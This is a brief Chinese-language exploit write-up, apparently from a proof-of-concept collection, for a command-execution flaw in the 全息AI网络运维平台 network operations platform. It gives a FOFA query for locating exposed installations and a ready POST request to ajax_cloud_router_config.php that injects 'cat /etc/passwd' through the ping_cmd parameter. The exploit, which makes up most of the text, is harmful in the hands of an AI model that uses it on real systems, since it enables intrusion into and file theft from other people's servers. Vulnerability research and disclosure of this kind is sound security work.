# 全息AI网络运维平台ajax_cloud_router_config.php存在命令执行漏洞

全息AI网络运维平台 接口 /nmss/cloud/Ajax/ajax_cloud_router_config.php 存在命令执行漏洞，导致服务器沦陷。

## fofa

```yaml
"全息AI网络运维平台"
```

## poc

```yaml
POST /nmss/cloud/Ajax/ajax_cloud_router_config.php HTTP/1.1
host：127.0.0.1

ping_cmd=8.8.8.8|cat /etc/passwd>1.txt
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407190100660.png)